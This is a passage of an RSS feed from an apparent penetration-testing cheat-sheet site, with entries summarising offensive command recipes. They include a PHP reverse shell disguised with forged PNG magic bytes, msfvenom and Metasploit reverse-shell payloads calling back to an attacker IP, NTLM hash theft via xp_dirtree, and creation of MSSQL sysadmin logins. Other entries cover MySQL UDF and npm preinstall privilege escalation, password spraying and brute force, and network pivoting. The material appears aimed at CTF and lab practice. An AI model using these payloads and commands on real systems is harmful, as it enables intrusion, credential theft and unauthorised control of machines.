      <guid>https://tldrbins.github.io/magic_bytes/</guid>
      <description>Forge File Signature png echo &amp;#39;89 50 4E 47 0D 0A 1A 0A&amp;#39; | xxd -p -r &amp;gt;&amp;gt; php-reverse-shell.php.png cat php-reverse-shell.php &amp;gt;&amp;gt; php-reverse-shell.php.png </description>
    </item>
    <item>
      <title>memcache</title>
      <link>https://tldrbins.github.io/memcache/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/memcache/</guid>
      <description>Connect telnet memcached-cli # Connect telnet 127.0.0.1 11211 # Install sudo npm install -g memcached-cli # Connect (With Creds) memcached-cli &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;:11211&amp;#39; Basic Commmands # Info about slabs stats slabs # Show slab info (e.g. slab 1 and display all keys) stats cachedump 1 0 # Dump info get &amp;lt;ITEM_NAME&amp;gt; </description>
    </item>
    <item>
      <title>Memory Dump</title>
      <link>https://tldrbins.github.io/memory_dump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/memory_dump/</guid>
      <description>Tools binwalk pypykatz # Extract files from memory dump binwalk -M -e &amp;lt;MEMORY_DUMP&amp;gt; Ref: binwalk&#xA;# Mini Dump pypykatz lsa minidump &amp;lt;MEMORY_DUMP&amp;gt; </description>
    </item>
    <item>
      <title>Metasploit</title>
      <link>https://tldrbins.github.io/metasploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/metasploit/</guid>
      <description>msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts &amp;lt;TARGET&amp;gt; set lhost &amp;lt;LOCAL_IP&amp;gt; set lport &amp;lt;LOCAL_PORT&amp;gt; # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
    </item>
    <item>
      <title>Metasploit Listener</title>
      <link>https://tldrbins.github.io/metasploit_listener/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/metasploit_listener/</guid>
      <description>Start a Metasploit Listener msfconsole -q $ msfconsole -q msf6 &amp;gt; use exploit/multi/handler msf6 &amp;gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp # Windows x64 set payload windows/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp payload =&amp;gt; windows/x64/meterpreter/reverse_tcp # Linux amd64 set payload linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) &amp;gt; set payload linux/x64/meterpreter/reverse_tcp payload =&amp;gt; linux/x64/meterpreter/reverse_tcp set lhost &amp;lt;LOCAL_IP&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lhost 10.10.14.31 lhost =&amp;gt; 10.10.14.31 set lport &amp;lt;LOCAL_PORT&amp;gt; msf6 exploit(multi/handler) &amp;gt; set lport 1337 lport =&amp;gt; 1337 # Useful for multiple connections set exitonsession false msf6 exploit(multi/handler) &amp;gt; set exitonsession false exitonsession =&amp;gt; false run -j msf6 exploit(multi/handler) &amp;gt; run -j [*] Exploit running as background job 1.</description>
    </item>
    <item>
      <title>Metasploit Shellcode</title>
      <link>https://tldrbins.github.io/metasploit_shellcode/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 &amp;gt; rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; &amp;gt; rev.</description>
    </item>
    <item>
      <title>Microsoft Access Database</title>
      <link>https://tldrbins.github.io/microsoft_access_database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_access_database/</guid>
      <description>Tools mdbtools sudo apt install mdbtools Basic # Show all tables mdb-tables &amp;lt;MDB_FILE&amp;gt; $ mdb-tables backup.mdb acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock ...[SNIP]... # Show tables with data mdb-tables &amp;lt;MDB_FILE&amp;gt; | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export &amp;lt;MDB_FILE&amp;gt; $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done $ mdb-tables backup.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep .</description>
    </item>
    <item>
      <title>Microsoft Oulook Email Folder</title>
      <link>https://tldrbins.github.io/microsoft_outlook/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
      <description>Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst &amp;#39;&amp;lt;PST_FILE&amp;gt;&amp;#39; $ readpst &amp;#39;Access Control.pst&amp;#39; Opening PST file and indexes... Processing Folder &amp;#34;Deleted Items&amp;#34; &amp;#34;Access Control&amp;#34; - 2 items done, 0 items skipped. # Open .mbox (plaintext) cat &amp;#39;&amp;lt;MBOX_FILE&amp;gt;&amp;#39; $ cat &amp;#39;Access Control.mbox&amp;#39; From &amp;#34;john@megacorp.com&amp;#34; Fri Aug 24 07:44:07 2018 Status: RO From: john@megacorp.com &amp;lt;john@megacorp.com&amp;gt; Subject: MegaCorp Access Control System &amp;#34;security&amp;#34; account To: &amp;#39;security@accesscontrolsystems.</description>
    </item>
    <item>
      <title>MongoDB General</title>
      <link>https://tldrbins.github.io/mongodb_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mongodb_general/</guid>
      <description>General Connect to Mongo Database anonymous authenticate mongosh &amp;lt;TARGET&amp;gt;:27017 $ mongosh 172.17.0.3:27017 Current Mongosh Log ID: 66f2fa2192b07a1eeb856ec6 Connecting to: mongodb://172.17.0.3:27017/?directConnection=true&amp;amp;appName=mongosh+2.2.12 Using MongoDB: 5.0.6 Using Mongosh: 2.2.12 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ ------ The server generated these startup warnings when booting 2024-09-24T10:44:22.876+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem 2024-09-24T10:44:23.824+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted ------ Warning: Found ~/.</description>
    </item>
    <item>
      <title>Monitor Process (Windows)</title>
      <link>https://tldrbins.github.io/monitor_process_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/monitor_process_windows/</guid>
      <description>powershell Template # Define the process name $processName = &amp;#34;&amp;lt;PROCESS&amp;gt;&amp;#34; # Define the interval in seconds between checks (e.g., 5 seconds) $interval = 5 # Start an infinite loop while ($true) { # Check if the process is running $process = Get-Process -Name $processName -ErrorAction SilentlyContinue if ($process) { # If the process is found, perform your action Write-Host &amp;#34;&amp;lt;PROCESS&amp;gt; process is running.&amp;#34; # Perform your custom action here # Example: Write-Host &amp;#34;Performing action.</description>
    </item>
    <item>
      <title>Mount Share</title>
      <link>https://tldrbins.github.io/share_mount/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/share_mount/</guid>
      <description>nfs smb List share showmount -e &amp;lt;TARGET&amp;gt; $ showmount -e 10.10.11.191 Export list for 10.10.11.191: /home/ross * /var/www/html * Mount share sudo mkdir /mnt/share $ sudo mkdir /mnt/share sudo mount -t nfs &amp;lt;TARGET&amp;gt;:&amp;lt;SHARE&amp;gt; /mnt/share/ $ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/ $ ls /mnt/share Desktop Documents Downloads Music Pictures Public Templates Videos Unmount share sudo umount /mnt/share/ $ sudo umount /mnt/share/ Mount share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # Without creds sudo mount -t cifs -o user=,password= //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o user=&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;,pass=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt $ sudo mount -t cifs -o ro,user=&amp;#39;localadmin&amp;#39;,password=&amp;#39;Secret123&amp;#39; //10.</description>
    </item>
    <item>
      <title>MSSQL Agent Jobs</title>
      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
    </item>
    <item>
      <title>MSSQL General</title>
      <link>https://tldrbins.github.io/mssql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_general/</guid>
      <description>General Connect to MSSQL DB Linux Windows impacket-mssqlclient &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # With inline query sqlcmd -S &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DB_NAME&amp;gt; -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check current user SELECT suser_name(); # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
    </item>
    <item>
      <title>MSSQL Linked Servers</title>
      <link>https://tldrbins.github.io/mssql_linked_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
      <description>Basic Commands Hint: Use double &amp;apos;&amp;apos; to escape &amp;apos; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; # Show linked servers enum_links Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN &amp;lt;USER&amp;gt; WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] </description>
    </item>
    <item>
      <title>MSSQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
      <description>Enum # Import Module . .\PowerUpSQL.ps1 # Audit Invoke-SQLAudit -Instance &amp;lt;TARGET&amp;gt; -Username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -Password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -Verbose # Execute Query Get-SQLQuery -Instance &amp;lt;TARGET&amp;gt; -Username &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -Password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -Query &amp;#34;&amp;lt;QUERY&amp;gt;&amp;#34; -Verbose Ref: PowerUpSQL.ps1&#xA;Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; use master; exec xp_dirtree &amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;; load_file(&amp;#39;\\&amp;lt;LOCAL_IP&amp;gt;\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.</description>
    </item>
    <item>
      <title>Mysql General</title>
      <link>https://tldrbins.github.io/mysql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_general/</guid>
      <description>General Connect to mysql Database # Database unknown mysql -u &amp;lt;USER&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Database known mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Execute query inline mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -e &amp;#39;show tables;&amp;#39; Basic Commands # Show all databases show databases; # Choose database use &amp;lt;DB_NAME&amp;gt;; # Show all tables show tables; # Show all entries in table_name select * from &amp;lt;TABLE_NAME&amp;gt;; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.</description>
    </item>
    <item>
      <title>Mysql Privilege Escalation</title>
      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
      <description>Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p&amp;lt;PASSWORD&amp;gt; mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
    </item>
    <item>
      <title>NetExec (nxc)</title>
      <link>https://tldrbins.github.io/nxc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nxc/</guid>
      <description>Basic Commands # Single user, single password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Single user, single password, local auth nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --local-auth # Single user, single password (Active Directory) nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; # Single user, multiple passwords nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;lt;PASSWORDS&amp;gt; -d &amp;lt;DOMAIN&amp;gt; # Multiple users, single password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; --continue-on-success # Multiple users, multiple passwords nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; -d &amp;lt;DOMAIN&amp;gt; --continue-on-success # Match username to corresponding password nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;lt;USERNAMES&amp;gt; -p &amp;lt;PASSWORDS&amp;gt; --no-bruteforce --continue-on-success # With hash nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;lt;HASH&amp;gt; # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc &amp;lt;PROTOCOL&amp;gt; &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k Hint: we can also run on multiple targets</description>
    </item>
    <item>
      <title>Network Discovery</title>
      <link>https://tldrbins.github.io/network_discovery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/network_discovery/</guid>
      <description>Test connectivity Linux Windows # Default infinite pings ping -c3 &amp;lt;TARGET&amp;gt; # Default 5 pings ping &amp;lt;TARGET&amp;gt; # Check specific port Test-NetConnection &amp;lt;TARGET&amp;gt; -Port &amp;lt;TARGET_PORT&amp;gt; Test reverse connectivity Linux sudo tcpdump -ni tun0 icmp Sniff network traffic Linux # Sniff on network adapter sudo tcpdump -i eth0 -w packets.pcap root@NIX01:/dev/shm# sudo tcpdump -i eth0 -w packets.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C124 packets captured &amp;lt;----- Send Ctrl+C after some time 133 packets received by filter 0 packets dropped by kernel # For example: on port 389 sudo tcpdump -i lo -nnXs 0 &amp;#39;port &amp;lt;TARGET_PORT&amp;gt;&amp;#39; # Sniff HTTPS traffic sudo .</description>
    </item>
    <item>
      <title>Network Traffic Pivoting</title>
      <link>https://tldrbins.github.io/network_traffic_privoting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/network_traffic_privoting/</guid>
      <description>chisel metasploit ssh socat sliver Basic # Start a local chisel Server ./chisel server --reverse --port 8000 $ ./chisel server --reverse --port 8000 2024/09/23 12:27:03 server: Reverse tunnelling enabled 2024/09/23 12:27:03 server: Fingerprint ikFn6iQOOodxIlcDQI4dvFu1pdHgV5UnHRenxUg0eho= 2024/09/23 12:27:03 server: Listening on http://0.0.0.0:8000 Ports forwarding # In target machine ./chisel client &amp;lt;LOCAL_IP&amp;gt;:8000 R:&amp;lt;TARGET_PORT&amp;gt;:127.0.0.1:&amp;lt;TARGET_PORT&amp;gt; # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client &amp;lt;LOCAL_IP&amp;gt;:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 Socks5 # In target machine .</description>
    </item>
    <item>
      <title>Nginx</title>
      <link>https://tldrbins.github.io/nginx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nginx/</guid>
      <description>Config location /etc/nginx/sites-enabled </description>
    </item>
    <item>
      <title>Nmap</title>
      <link>https://tldrbins.github.io/nmap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nmap/</guid>
      <description>Nmap Scan TCP UDP Script target=&amp;lt;TARGET&amp;gt; nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target target=&amp;lt;TARGET&amp;gt; nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Update scripts DB nmap --script-updatedb Search scripts # e.</description>
    </item>
    <item>
      <title>npm</title>
      <link>https://tldrbins.github.io/npm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/npm/</guid>
      <description>SUDO Create a &amp;apos;package.json&amp;apos;&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
    </item>
    <item>
      <title>NTLM Relay Attack</title>
      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.</description>
    </item>
    <item>
      <title>NTP</title>
      <link>https://tldrbins.github.io/ntp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ntp/</guid>
      <description>Check Server Time sudo nmap -sU -sV --script &amp;#34;ntp* and (discovery or vuln) and not (dos or brute)&amp;#34; -p 123 &amp;lt;TARGET&amp;gt; Check Time Skew date; ntpdate -q &amp;lt;TARGET&amp;gt; Update Time ntpdate faketime Fix ntpdate from doing nothing sudo apt install chrony sudo timedatectl set-ntp true sudo ntpdate -s &amp;lt;TARGET&amp;gt; # After getting the time skew faketime -f &amp;lt;TIME_DIFF&amp;gt; &amp;lt;COMMAND&amp;gt; # Get from http server faketime &amp;#34;$(curl -sI &amp;lt;TARGET&amp;gt; | grep &amp;#39;Date:&amp;#39; | awk -F &amp;#39;Date:&amp;#39; &amp;#39;{print $2}&amp;#39;)&amp;#34; </description>
    </item>
    <item>
      <title>Openssl</title>
      <link>https://tldrbins.github.io/openssl/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/openssl/</guid>
      <description>Show TLS Certificate from HTTPS web server echo | openssl s_client -showcerts -servername &amp;lt;TARGET&amp;gt; -connect &amp;lt;TARGET&amp;gt;:443 2&amp;gt;/dev/null | openssl x509 -inform pem -noout -text Show content of a CSR openssl req -in request.csr -noout -text Create Client Certificate 1. Generate a user key openssl genrsa -out user.key 2048 2. Create a CSR openssl req -new -key user.key -out user.csr # Settings +-----------------------------------------------------------------------------+ | You are about to be asked to enter information that will be incorporated | | into your certificate request.</description>
    </item>
    <item>
      <title>openvpn</title>
      <link>https://tldrbins.github.io/openvpn/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/openvpn/</guid>
      <description>Connect to vpn sudo openvpn my_vpn.ovpn </description>
    </item>
    <item>
      <title>Oracle Database</title>
      <link>https://tldrbins.github.io/oracle/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/oracle/</guid>
      <description>Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; # User/Password brute force odat passwordguesser -s &amp;lt;TARGET&amp;gt; -d &amp;lt;SID&amp;gt; --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s &amp;lt;TARGET&amp;gt; -U &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -P &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;SID&amp;gt; --sysdba General # Export everytime or add to ~/.</description>
    </item>
    <item>
      <title>Padding Oracle</title>
      <link>https://tldrbins.github.io/padding_oracle/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/padding_oracle/</guid>
      <description>Tools padbuster # 8 or 16 : block size # encoding 0 : base64 padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://&amp;lt;TARGET&amp;gt;/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin Ref: Download padbuster</description>
    </item>
    <item>
      <title>Password Cracking</title>
      <link>https://tldrbins.github.io/password_cracking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/password_cracking/</guid>
